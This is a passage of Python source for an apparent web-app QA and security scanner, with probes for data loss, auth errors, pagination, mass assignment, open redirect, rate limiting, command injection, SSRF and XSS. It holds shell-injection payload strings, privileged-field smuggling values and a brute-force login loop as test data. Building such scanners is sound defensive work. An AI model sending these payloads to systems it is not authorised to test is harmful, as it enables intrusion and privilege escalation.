        if any(k in lf for k in _SERVER_OWNED):    # server-assigned — mismatch expected
            continue
        out.append(f)
    return out


_READBACK_RETRIES = 2       # extra reads before a "field was dropped" claim is believed
_READBACK_WAIT = 0.6        # seconds between them


def persistence_probe(model, base_url: str, *, session: requests.Session | None = None,
                      auth: dict | None = None) -> list[ProbeFinding]:
    """
    Silent data loss on save — the highest-value class in the QA field manual (§3.A1,
    §3.B). The app returns 2xx "saved successfully", but a field set on create is blank
    when the record is read back (nested/dotted binding dropped it, an optional field
    failed to bind). The false success is what makes it dangerous.

    Method (the QA lead's "persistence hunt": set → save → RELOAD → read back), with a
    built-in control so we never cry wolf:
      1. POST a create body where each persistable string field carries its OWN unique
         marker token, and the key field a unique key.
      2. The create must return 2xx (control: the write was accepted).
      3. GET the object back by its key; it must return 2xx (control: it round-trips).
      4. A field is PRESENT if its marker appears anywhere in the read-back body.
         Report ONLY when at least one marker survived (proves read works and the
         object persisted) AND at least one did not (that specific field was dropped).
         All-present = safe; all-absent = inconclusive (GET may not echo fields) → silent.

    Writes disposable records only (unique keys, marker values). Never DELETEs.
    Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names, nest_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair a "read by key" GET with the POST that creates into the same collection.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET":
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "slug", "key", "id"))), None)
        if key_field and _persistable_fields([f for f in pf if f != key_field]):
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        _no_candidates(sess, "persistence", "create endpoint paired with a read-by-key GET")
        return out

    token = None
    if any(p[0].get("auth_required") or p[1].get("auth_required") for p in pairs):
        token = _resolve_token(sess, base, recipe, model,
                               f"persist_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "persistence", token)

    tried = created_ok = read_ok = judged = 0
    for post, ge, prefix, param, key_field, pf in pairs[:4]:
        key = f"qaxkey{uuid.uuid4().hex[:10]}"
        markers: dict[str, str] = {}          # field -> its unique marker token
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty", "amount", "price")):
                body[f] = 1
            elif any(k in lf for k in ("is_", "enabled", "active", "admin", "approved")):
                body[f] = False
            elif any(k in lf for k in _DATE_KW):
                body[f] = "2020-01-01T00:00:00"
            elif any(k in lf for k in _SERVER_OWNED):
                body[f] = f"qax{uuid.uuid4().hex[:8]}"   # satisfy it, but don't track
            else:
                tok = f"qaxkeep{uuid.uuid4().hex[:10]}"
                markers[f] = tok
                body[f] = tok
        if not markers:
            continue
        tried += 1
        headers = _auth_headers(token, auth) if (post.get("auth_required") or ge.get("auth_required")) else {}
        try:
            cr = sess.post(f"{base}{prefix}", json=nest_body(body), headers=headers, timeout=15)
        except Exception:
            continue
        if not (200 <= cr.status_code < 300):      # control: the create must be accepted
            continue
        created_ok += 1
        _record_created(sess, prefix, body, headers)
        read_url = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
        try:
            rr = sess.get(read_url, headers=headers, timeout=15)
        except Exception:
            continue
        if not (200 <= rr.status_code < 300):      # control: the object must read back
            continue
        read_ok += 1
        read_text = rr.text or ""
        present = [f for f, tok in markers.items() if tok in read_text]
        dropped = [f for f, tok in markers.items() if tok not in read_text]
        # Read-back timing ("many 'nothing persisted' conclusions were false negatives
        # from reading a field before it repopulated"): before claiming data loss, re-read a
        # couple of times — an async write / replica lag / cache that catches up is not a drop.
        for _ in range(_READBACK_RETRIES):
            if not (present and dropped):
                break
            time.sleep(_READBACK_WAIT)
            try:
                again = sess.get(read_url, headers=headers, timeout=15)
            except Exception:
                break
            if not (200 <= again.status_code < 300):
                break
            read_text = again.text or ""
            present = [f for f, tok in markers.items() if tok in read_text]
            dropped = [f for f, tok in markers.items() if tok not in read_text]
        if present:
            judged += 1            # at least one field echoed → the read-back CAN show a drop
        # Need a positive control (something survived) AND a real drop. All-absent is
        # inconclusive — the GET may just not echo these fields — so stay silent.
        if present and dropped:
            saved_msg = ""
            try:
                j = cr.json()
                if isinstance(j, dict) and (j.get("success") or "saved" in str(j).lower()):
                    saved_msg = " and reported success"
            except Exception:
                pass
            out.append(ProbeFinding(
                probe="persistence",
                title=f"Silent data loss on save in POST {prefix} (field(s) {dropped} not persisted)",
                exploited=True, severity="P2",
                evidence=(f"Created an object under {prefix} (HTTP {cr.status_code}{saved_msg}); on "
                          f"reading it back via {ge['path']} the field(s) {dropped} were blank while "
                          f"{present} persisted. A field accepted with a success response but silently "
                          f"dropped on reload is data loss the user never sees."),
                target=str(post.get("path", prefix))))
    if not out and tried:
        if not created_ok:
            _skip(sess, "persistence", f"could not exercise it: the create request was rejected or failed on "
                                       f"all {tried} candidate endpoint(s), so there was nothing to read back",
                  needs="valid-body")
        elif not read_ok:
            _skip(sess, "persistence", "records were created but could not be read back by key (the read "
                                       "request failed), so a silent drop could not be judged")
        elif not judged:
            _skip(sess, "persistence", "the read-back did not echo any submitted field, so a dropped field "
                                       "could not be told apart from a field the GET never returns")
    return out
def auth_error_probe(model, base_url: str, *, session: requests.Session | None = None,
                     auth: dict | None = None) -> list[ProbeFinding]:
    """
    A forbidden request must return a clean 401/403, never a 5xx (QA field manual
    §3.F44: "500 where 403 belongs"). A crash in the auth layer leaks internals and
    pollutes monitoring. We call auth-required endpoints with a syntactically-invalid
    bearer token: a correct app answers 401/403 (and nothing is written, so write
    methods are safe); a 5xx is the finding. GET/POST/PUT/PATCH only (never DELETE).
    Control is self-evident — the token cannot authenticate anyone. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    bad = {"Authorization": "Bearer qax.invalid.token"}
    seen: set = set()
    cands = [x for x in getattr(model, "endpoints", []) if isinstance(x, dict)
             and x.get("auth_required")
             and str(x.get("method", "")).upper() in ("GET", "POST", "PUT", "PATCH")][:8]
    if not cands:
        _no_candidates(sess, "auth-error", "endpoint that requires authentication")
        return out
    reached = 0
    for e in cands:
        method = str(e.get("method", "GET")).upper()
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "1", path)
        sig = (method, resolved)
        if sig in seen:
            continue
        seen.add(sig)
        try:
            if method == "GET":
                r = sess.get(f"{base}{resolved}", headers=bad, timeout=15)
            else:
                r = sess.request(method, f"{base}{resolved}", json={}, headers=bad, timeout=15)
        except Exception:
            continue
        reached += 1
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="auth-error",
                title=f"Forbidden request returns a server error (5xx) on {method} {path}",
                exploited=True, severity="P2",
                evidence=(f"{method} {path} with an invalid bearer token returned HTTP "
                          f"{r.status_code} instead of a clean 401/403. An unauthorized request "
                          f"must be denied, not crash the server — a 5xx here leaks internals and "
                          f"hides real faults."),
                target=path))
    if not out and not reached:
        _unreached(sess, "auth-error", len(seen))
    return out
# Characters the QA field manual (§3.F41) saw trigger a raw 405 from an unsanitised
# search-engine query syntax — a distinctive signature that plain injection fuzzing
# (which hunts 5xx + SQL errors) does not report.
_SEARCH_SPECIALS = ("@", '"', "(", ")", "/", "|", "~", "^", "-")
_SEARCH_KW = ("q", "query", "search", "term", "keyword", "filter", "name", "title", "text")


def search_robustness_probe(model, base_url: str, *, session: requests.Session | None = None,
                            auth: dict | None = None) -> list[ProbeFinding]:
    """
    Search/filter inputs should never return a raw 405/5xx on an ordinary character
    (QA field manual §3.F41: unsanitised query-operator syntax rejected a search for
    `@ " ( ) / | ~`, i.e. emails and slash terms). Control: a benign term must be
    accepted (<400); a special character that then yields 405 (or 5xx) is the lead.
    Reported P3 — a robustness defect, not an exploit — and GET-only (safe to repeat).
    Complements injection_probe, which hunts the 5xx+SQL-error case. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    token = None
    searchable = []
    for x in [x for x in eps if str(x.get("method", "")).upper() == "GET" and x.get("query_params")][:8]:
        q_ = [q for q in (x.get("query_params") or []) if any(k == q.lower() or k in q.lower() for k in _SEARCH_KW)]
        if q_:
            searchable.append((x, q_))
    if not searchable:
        _no_candidates(sess, "search-robustness", "GET endpoint with a search/filter query parameter")
        return out
    exercised = 0
    reached_ = [0]

    for e, searchy in searchable:
        qps = list(e.get("query_params") or [])
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"search_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
                _need_token(sess, "search-robustness", token)
            headers = _auth_headers(token, auth)

        def hit(value, _qp, _p=path, _h=headers, _all=qps):
            params = {p: "qaxprobe1" for p in _all}
            params[_qp] = value
            try:
                r = sess.get(f"{base}{_p}", params=params, headers=_h, timeout=15)
                reached_[0] += 1
                return r.status_code
            except Exception:
                return None

        for qp in searchy[:2]:
            base_status = hit("qaxprobe1", qp)
            if base_status is None or base_status >= 400:
                continue                              # control must be accepted
            exercised += 1
            trigger = next((c for c in _SEARCH_SPECIALS
                            if (lambda s: s is not None and (s == 405 or s >= 500))(hit(c, qp))), None)
            if trigger is not None:
                status = hit(trigger, qp)
                out.append(ProbeFinding(
                    probe="search-robustness",
                    title=f"Search rejects an ordinary character with HTTP {status} on GET {e.get('path')}",
                    exploited=True, severity="P3",
                    evidence=(f"On GET {e.get('path')} a benign term in '{qp}' returned {base_status}, "
                              f"but the character '{trigger}' returned HTTP {status}. Real searches "
                              f"(emails, slash-separated terms) contain these characters; an unsanitised "
                              f"query syntax rejects them instead of escaping them."),
                    target=str(e.get("path", ""))))
    if not out:
        if not reached_[0]:
            _unreached(sess, "search-robustness", len(searchable))
        elif not exercised:
            _skip(sess, "search-robustness", "could not exercise it: the benign search request was rejected "
                                             "(4xx) on every candidate endpoint, so special characters had "
                                             "nothing valid to be compared with", needs="valid-body")
    return out
_LIST_KEYS = ("items", "data", "results", "records", "rows", "list", "content", "entries")


def _extract_list(payload):
    """Pull the main array out of a list response (bare array or wrapped under a key)."""
    if isinstance(payload, list):
        return payload
    if isinstance(payload, dict):
        for k in _LIST_KEYS:
            if isinstance(payload.get(k), list):
                return payload[k]
    return None


def unpaginated_list_probe(model, base_url: str, *, session: requests.Session | None = None,
                           auth: dict | None = None) -> list[ProbeFinding]:
    """
    Large collections must paginate (QA field manual §3.D26: list pages returned
    1,700+ rows with no pager, bloating the DOM and the payload). Fetch each
    collection GET; if it returns a large array AND re-fetching with a limit param
    set to 1 returns the SAME large array (the limit is ignored), pagination is
    absent. The limit=1 re-fetch is the control: if it returns 1 row, pagination
    works and we stay silent — so this fires only on a proven unbounded list. P3,
    GET-only, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    THRESHOLD = 100
    token = None

    # Collection GETs: no path parameter (a listing, not a single record).
    cols = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
            and "{" not in str(e.get("path", ""))]
    if not cols:
        _no_candidates(sess, "unpaginated-list", "parameter-free collection GET")
        return out
    seen: set = set()
    reached = 0
    big = 0
    for e in cols[:30]:
        path = str(e.get("path", ""))
        if path in seen:
            continue
        seen.add(path)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"page_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
                _need_token(sess, "unpaginated-list", token)
            headers = _auth_headers(token, auth)
        try:
            r = sess.get(f"{base}{path}", headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        try:
            if r.status_code >= 400:
                continue
            rows = _extract_list(r.json())
        except Exception:
            continue
        if rows is None or len(rows) < THRESHOLD:
            continue
        big += 1
        full = len(rows)
        # Control: ask for a single row via the common limit params. If honoured,
        # pagination works — stay silent.
        honoured = False
        for lp in ("limit", "per_page", "page_size", "pageSize", "size", "count", "top"):
            try:
                r2 = sess.get(f"{base}{path}", params={lp: 1}, headers=headers, timeout=15)
                rows2 = _extract_list(r2.json()) if r2.status_code < 400 else None
            except Exception:
                rows2 = None
            if rows2 is not None and len(rows2) <= max(1, full // 2):
                honoured = True
                break
        if honoured:
            continue
        out.append(ProbeFinding(
            probe="unpaginated-list",
            title=f"Collection GET {path} returns an unbounded, unpaginated list",
            exploited=True, severity="P3",
            evidence=(f"GET {path} returned {full} rows in one response and ignored a limit=1 "
                      f"request (still {full} rows). An unbounded list grows without limit as data "
                      f"accumulates — slow payloads, heavy DOM, and a denial-of-service lever."),
            target=path))
    if not out:
        if not reached:
            _unreached(sess, "unpaginated-list", len(seen))
        elif not big:
            _skip(sess, "unpaginated-list", f"no collection returned {THRESHOLD}+ rows (the app has little "
                                            f"data), so whether its lists are paginated could not be observed",
                  kind="not-applicable")
    return out
# Privileged fields a client should never be able to set at registration. If the
# created record echoes one back as granted, the server mass-assigned it.
_PRIV_FIELDS = {"admin": True, "is_admin": True, "isAdmin": True, "is_staff": True,
                "is_superuser": True, "role": "admin", "roles": ["admin"], "account_balance": 999999}


def mass_assignment_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
    """
    Mass assignment / BOPLA (OWASP API6): registration binds the whole request body
    to the model, so a client can smuggle a privileged field (admin=true, role=admin).
    We register with those extra fields and confirm ONLY when the created record the
    server returns echoes one back as set — proof the field was accepted, not stripped.
    A normal body never contains them, so this is a controlled, low-FP signal. P2.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    ident = f"massassign_{uuid.uuid4().hex[:8]}@example.com"
    body = register_body(recipe, model, ident)
    body.update(_PRIV_FIELDS)
    try:
        r = sess.post(f"{base}{recipe['register_path']}", json=body, timeout=15)
    except Exception:
        _unreached(sess, "mass-assignment", 1)
        return out
    if r.status_code >= 300:
        _registration_failed(sess, "mass-assignment", recipe["register_path"], r.status_code)
        return out
    _record_created(sess, _collection_of(recipe["register_path"]), body, {})
    try:
        data = r.json()
    except Exception:
        _skip(sess, "mass-assignment", "the registration response is not JSON, so the privileged "
                                       "fields it should have refused could not be inspected")
        return out
    # Flatten one level so a {"user": {...}} wrapper is still inspected.
    scopes = [data] + ([v for v in data.values() if isinstance(v, dict)] if isinstance(data, dict) else [])
    granted = []
    for scope in scopes:
        if not isinstance(scope, dict):
            continue
        for k, v in _PRIV_FIELDS.items():
            if k in scope and scope[k] == v:
                granted.append(f"{k}={v}")
    if granted:
        out.append(ProbeFinding(
            probe="mass-assignment",
            title=f"Mass assignment: registration accepted privileged field(s) {', '.join(sorted(set(granted)))}",
            exploited=True, severity="P2",
            evidence=(f"POST {recipe['register_path']} with extra field(s) in the body returned a "
                      f"created record echoing {', '.join(sorted(set(granted)))}. The server bound "
                      f"client-supplied fields it should never let a user set (privilege escalation)."),
            target=recipe["register_path"]))
    return out


# Parameter names commonly used for post-action redirects.
_REDIRECT_PARAMS = ("next", "url", "redirect", "redirect_uri", "redirect_url", "return",
                    "returnTo", "return_to", "dest", "destination", "continue", "to", "goto")
_REDIRECT_EVIL = "https://qax-redirect.example/evil"
# Endpoint-path hints where a redirect target is commonly taken from a parameter.
_REDIRECT_EP_KW = ("login", "logout", "redirect", "oauth", "sso", "auth", "continue",
                   "return", "callback", "next", "goto", "signin", "signout")


def open_redirect_probe(model, base_url: str, *, session: requests.Session | None = None,
                        auth: dict | None = None) -> list[ProbeFinding]:
    """
    Open redirect (OWASP): a redirect target taken from a request parameter without an
    allow-list lets an attacker bounce victims to a site they control (phishing, OAuth
    token theft). We pass an external URL in common redirect params and confirm ONLY
    when the response's Location header actually points at our external host — the
    redirect itself is the proof. P2. Near-zero FP.
    """
    sess = session or requests.Session()
    from urllib.parse import urlparse
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    evil_host = urlparse(_REDIRECT_EVIL).netloc

    # Open redirects almost always live on auth/navigation endpoints, so test the
    # root plus GET endpoints whose path hints at a redirect — not every GET × every
    # param (which would explode on a large API). Capped for safety.
    targets = ["/"]
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                and "{" not in str(e.get("path", ""))
                and any(k in str(e.get("path", "")).lower() for k in _REDIRECT_EP_KW)):
            targets.append(str(e.get("path", "")))
    targets = targets[:6]
    seen_target: set = set()
    reached = 0
    for path in targets:
        if path in seen_target:
            continue
        seen_target.add(path)
        for param in _REDIRECT_PARAMS:
            url = f"{base}{path}?{param}={_REDIRECT_EVIL}"
            try:
                r = sess.get(url, headers={}, allow_redirects=False, timeout=15)
            except Exception:
                continue
            reached += 1
            if 300 <= getattr(r, "status_code", 0) < 400:
                loc = (r.headers.get("Location") or "").strip()
                if urlparse(loc).netloc == evil_host:
                    out.append(ProbeFinding(
                        probe="open-redirect",
                        title=f"Open redirect via '{param}' on {path}",
                        exploited=True, severity="P2",
                        evidence=(f"GET {path}?{param}={_REDIRECT_EVIL} responded {r.status_code} with "
                                  f"Location: {loc[:120]} — the app redirects to an attacker-controlled "
                                  f"external host taken straight from the request parameter."),
                        target=path))
                    return out  # one proof is enough
    if not reached:
        _unreached(sess, "open-redirect", len(seen_target))
    return out


def rate_limit_probe(model, base_url: str, *, session: requests.Session | None = None,
                     auth: dict | None = None) -> list[ProbeFinding]:
    """
    Missing brute-force protection (OWASP API4): the login endpoint should throttle or
    lock after repeated failures. We register a user, then send 12 wrong-password logins;
    if NONE are rate-limited (429) or locked (423) the endpoint has no brute-force guard.
    Reported as a P3 lead — absence of a control, not a proven exploit — so it never
    inflates the confirmed count.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    ident = f"ratelimit_{uuid.uuid4().hex[:8]}@example.com"
    try:
        reg = sess.post(f"{base}{recipe['register_path']}", json=register_body(recipe, model, ident), timeout=15)
    except Exception:
        _unreached(sess, "rate-limit", 1)
        return out
    if getattr(reg, "status_code", 500) >= 300:
        _registration_failed(sess, "rate-limit", recipe["register_path"], getattr(reg, "status_code", 500))
        return out  # couldn't create the account → can't judge login throttling

    bad_login = {recipe["id_field"]: ident, recipe["secret_field"]: "wrong-" + uuid.uuid4().hex[:6]}
    statuses: list[int] = []
    for _ in range(12):
        try:
            r = sess.post(f"{base}{recipe['login_path']}", json=bad_login, timeout=15)
        except Exception:
            _skip(sess, "rate-limit", f"the login endpoint stopped answering after {len(statuses)} attempt(s)")
            return out
        statuses.append(getattr(r, "status_code", 0))
    throttled = any(s in (429, 423) for s in statuses)
    # Only speak when every attempt was a normal auth failure (4xx) and none throttled —
    # avoids firing on an endpoint that errored or behaved oddly.
    if not throttled and statuses and all(400 <= s < 500 for s in statuses):
        out.append(ProbeFinding(
            probe="rate-limit",
            title="No rate limiting / lockout on the login endpoint",
            exploited=True, severity="P3",
            evidence=(f"12 consecutive failed logins at {recipe['login_path']} all returned "
                      f"HTTP {statuses[-1]} with no 429/423 — the endpoint has no visible "
                      f"brute-force throttling or account lockout."),
            target=recipe["login_path"]))
    if not out and not throttled:
        _skip(sess, "rate-limit", f"the login endpoint did not behave like a normal auth failure "
                                  f"(statuses {sorted(set(statuses))}), so throttling could not be judged")
    return out
# ── command injection ─────────────────────────────────────────────────────────
# Param/endpoint names that commonly feed an OS command (ping/dns/host tools, etc.).
_CMD_KW = ("cmd", "command", "exec", "run", "system", "shell", "ping", "ip", "ipaddr",
           "host", "hostname", "addr", "address", "domain", "target", "dns", "nslookup",
           "traceroute", "lookup")


def _cmd_candidates(model):
    """(endpoint, method, param, where) tuples whose name/path hints at a shell command."""
    out = []
    for e in getattr(model, "endpoints", []):
        if not isinstance(e, dict):
            continue
        method = str(e.get("method", "GET")).upper()
        path = str(e.get("path", ""))
        path_hit = any(k in path.lower() for k in _CMD_KW)
        if method == "GET":
            for qp in (e.get("query_params") or []):
                if path_hit or any(k in str(qp).lower() for k in _CMD_KW):
                    out.append((e, method, qp, "query"))
        elif method in ("POST", "PUT", "PATCH"):
            from core.auth_recipe import field_names
            for f in field_names(e.get("request_fields")):
                if path_hit or any(k in str(f).lower() for k in _CMD_KW):
                    out.append((e, method, f, "body"))
    return out


def command_injection_probe(model, base_url: str, *, session: requests.Session | None = None,
                            auth: dict | None = None) -> list[ProbeFinding]:
    """
    OS command injection (OWASP). For params that feed a shell command, we PROVE
    execution two ways, each with a control:
      • output-based — inject `; echo <unique token>` (and `&&`, `|`, `$()`, backticks);
        if the token appears in the response but NOT in the benign baseline, our command
        ran and its output came back.
      • time-based (fallback) — inject `; sleep 5`; if the response is ~5s slower than the
        benign baseline, the command ran blind.
    The unique token / timing delta is the control, so this is a proven P1, not a guess.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, nest_body
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    cands = _cmd_candidates(model)
    if not cands:
        _no_candidates(sess, "command-injection", "parameter whose name or path hints at a shell command")
        return out
    auth_tok = None          # NB: not `token` — this probe reuses that name for its echo marker
    if any(c[0].get("auth_required") for c in cands):
        auth_tok = _resolve_token(sess, base, derive_auth_recipe(model), model,
                                  f"cmd_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "command-injection", auth_tok)

    def send(e, method, param, where, value):
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        hdr = _auth_headers(auth_tok, auth) if e.get("auth_required") else {}
        try:
            if where == "query":
                r = sess.get(f"{base}{path}", params={param: value}, headers=hdr, timeout=20)
            else:
                r = sess.request(method, f"{base}{path}", json=nest_body({param: value}), headers=hdr, timeout=20)
            return r
        except Exception:
            return None

    benign = "127.0.0.1"
    seen: set = set()
    reached = 0
    for e, method, param, where in cands[:6]:
        sig = (str(e.get("path", "")), method, param)
        if sig in seen:
            continue
        seen.add(sig)
        base_r = send(e, method, param, where, benign)
        base_body = (base_r.text or "") if base_r is not None else ""
        t0 = time.time()
        base_r2 = send(e, method, param, where, benign)
        base_time = time.time() - t0
        if base_r2 is None:
            continue
        reached += 1

        # 1) output-based: a unique token echoed back proves execution.
        token = f"qaxcmd{uuid.uuid4().hex[:10]}"
        hit = None
        for payload in (f"{benign};echo {token}", f"{benign}&&echo {token}", f"{benign}|echo {token}",
                        f"{benign}`echo {token}`", f"{benign}$(echo {token})"):
            r = send(e, method, param, where, payload)
            if r is not None and token in (r.text or "") and token not in base_body:
                hit = ("output", payload, r.status_code)
                break
        # 2) time-based fallback: a sleep that slows the response proves blind execution.
        if not hit:
            for payload in (f"{benign};sleep 5", f"{benign}&&sleep 5", f"{benign}$(sleep 5)", f"{benign}`sleep 5`"):
                t = time.time()
                r = send(e, method, param, where, payload)
                elapsed = time.time() - t
                if r is not None and elapsed >= base_time + 4:
                    hit = ("time", payload, r.status_code)
                    break
        if hit:
            how = ("its output was reflected" if hit[0] == "output"
                   else "the response was delayed ~5s by a sleep")
            out.append(ProbeFinding(
                probe="command-injection",
                title=f"OS command injection via {where} param '{param}' on {e.get('path')}",
                exploited=True, severity="P1",
                evidence=(f"{method} {e.get('path')} with '{param}'='{hit[1]}' executed an injected shell "
                          f"command ({how}; HTTP {hit[2]}). User input reaches a shell without "
                          f"sanitisation — full remote code execution."),
                target=str(e.get("path", ""))))
    if not out and not reached:
        _unreached(sess, "command-injection", len(seen))
    return out


# ── SSRF (server-side request forgery) ────────────────────────────────────────
# Param/endpoint names that commonly take a URL the server will fetch.
_URL_KW = ("url", "uri", "link", "src", "target", "callback", "webhook", "fetch",
           "proxy", "dest", "destination", "feed", "endpoint", "site", "host", "image",
           "img", "load", "remote", "upstream", "q")


def _url_candidates(model):
    """(endpoint, method, param, where) tuples whose name/path hints at a fetched URL."""
    out = []
    for e in getattr(model, "endpoints", []):
        if not isinstance(e, dict):
            continue
        method = str(e.get("method", "GET")).upper()
        path = str(e.get("path", ""))
        path_hit = any(k in path.lower() for k in ("ssrf", "fetch", "proxy", "image", "url", "webhook", "preview"))
        if method == "GET":
            for qp in (e.get("query_params") or []):
                if path_hit or any(k == str(qp).lower() or k in str(qp).lower() for k in _URL_KW):
                    out.append((e, method, qp, "query"))
        elif method in ("POST", "PUT", "PATCH"):
            from core.auth_recipe import field_names
            for f in field_names(e.get("request_fields")):
                if path_hit or any(k == str(f).lower() or k in str(f).lower() for k in _URL_KW):
                    out.append((e, method, f, "body"))
    return out


def ssrf_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Server-Side Request Forgery (OWASP). For params that take a URL the server fetches,
    QAX starts a local HTTP listener and injects a URL pointing at it with a UNIQUE
    token. If the listener is hit for that token, the target made an outbound request to
    an attacker-chosen URL — a proven SSRF (out-of-band interaction is the control, so
    zero false positives). Local-scan oriented: the target must be able to reach the
    scanner's 127.0.0.1, which holds when QAX runs against an app on the same host.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, nest_body
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    cands = _url_candidates(model)
    if not cands:
        _no_candidates(sess, "ssrf", "parameter that takes a URL the server fetches")
        return out
    auth_tok = None          # NB: not `token` — this probe reuses that name for its callback marker
    if any(c[0].get("auth_required") for c in cands):
        auth_tok = _resolve_token(sess, base, derive_auth_recipe(model), model,
                                  f"ssrf_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "ssrf", auth_tok)

    import http.server
    import threading
    hits: set = set()

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.add(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"qax")

        def log_message(self, *a):
            pass

    try:
        srv = http.server.HTTPServer(("127.0.0.1", 0), _Handler)
    except Exception:
        _skip(sess, "ssrf", "could not start the local callback listener QAX needs to detect an "
                            "outbound request")
        return out
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    reached = [0]

    def send(e, method, param, where, value):
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        hdr = _auth_headers(auth_tok, auth) if e.get("auth_required") else {}
        try:
            # allow_redirects=False: if the app merely 302s to our URL, it is the SCANNER that would
            # then fetch the callback — that is an open redirect, not the server making a request.
            if where == "query":
                r = sess.get(f"{base}{path}", params={param: value}, headers=hdr, timeout=10,
                             allow_redirects=False)
            else:
                r = sess.request(method, f"{base}{path}", json=nest_body({param: value}), headers=hdr,
                                 timeout=10, allow_redirects=False)
        except Exception:
            return None
        reached[0] += 1
        return r

    try:
        seen: set = set()
        for e, method, param, where in cands[:6]:
            sig = (str(e.get("path", "")), method, param)
            if sig in seen:
                continue
            seen.add(sig)
            token = f"qaxssrf{uuid.uuid4().hex[:10]}"
            send(e, method, param, where, f"http://127.0.0.1:{port}/{token}")
            deadline = time.time() + _SSRF_WAIT
            got = False
            while time.time() < deadline:
                if any(token in h for h in hits):
                    got = True
                    break
                time.sleep(0.1)
            if got:
                out.append(ProbeFinding(
                    probe="ssrf",
                    title=f"SSRF via {where} param '{param}' on {e.get('path')}",
                    exploited=True, severity="P2",
                    evidence=(f"{method} {e.get('path')} with '{param}' set to a URL under our control "
                              f"caused the server to make an outbound request to it (confirmed by an "
                              f"out-of-band callback). An attacker can make the server reach internal "
                              f"services, cloud metadata, or arbitrary hosts."),
                    target=str(e.get("path", ""))))
    finally:
        try:
            srv.shutdown()
        except Exception:
            pass
    if not out:
        if not reached[0]:
            _unreached(sess, "ssrf", len(cands[:6]))
        elif not _is_local_target(base):
            # The callback listener lives on the SCANNER's 127.0.0.1; a remote target cannot reach it,
            # so "no callback" proves nothing. Say so instead of reporting a clean result.
            _skip(sess, "ssrf", "the target is not on this machine, so it cannot reach QAX's local callback "
                                "listener — a missing callback proves nothing; test SSRF from a host the "
                                "target can reach, or against a local/staging copy")
    return out


# ── reflected XSS ─────────────────────────────────────────────────────────────
def xss_probe(model, base_url: str, *, session: requests.Session | None = None,
              auth: dict | None = None) -> list[ProbeFinding]:
    """
    Reflected cross-site scripting (OWASP). Inject a unique markup token `<qax…>` into
    GET query params; confirm ONLY when the EXACT markup comes back UNENCODED in an
    HTML response (Content-Type: text/html). An app that encodes output returns
    `&lt;qax…&gt;` (no match) and a JSON API isn't HTML, so this is a proven reflection
    into an HTML sink — not a guess. P2. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and (e.get("query_params"))]
    if not cands:
        _no_candidates(sess, "xss", "GET endpoint with query parameters")
